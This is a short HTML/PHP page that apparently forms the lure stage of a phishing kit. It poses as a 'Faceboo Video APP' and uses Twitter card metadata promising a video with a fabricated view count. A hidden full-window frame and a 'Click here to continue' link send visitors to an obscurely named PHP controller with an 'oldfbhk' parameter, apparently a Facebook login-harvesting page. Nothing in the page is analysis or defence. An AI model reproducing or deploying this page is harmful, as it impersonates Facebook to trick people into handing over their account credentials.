
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="358,841 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERec13adb4-780b-4cf0-b3fa-3a71b3d69aac.php?source=.%2Fpublic%2FACCESSS244f8e05-b5d0-44b6-8589-8906a0580d92&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERec13adb4-780b-4cf0-b3fa-3a71b3d69aac.php?source=.%2Fpublic%2FACCESSS244f8e05-b5d0-44b6-8589-8906a0580d92&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   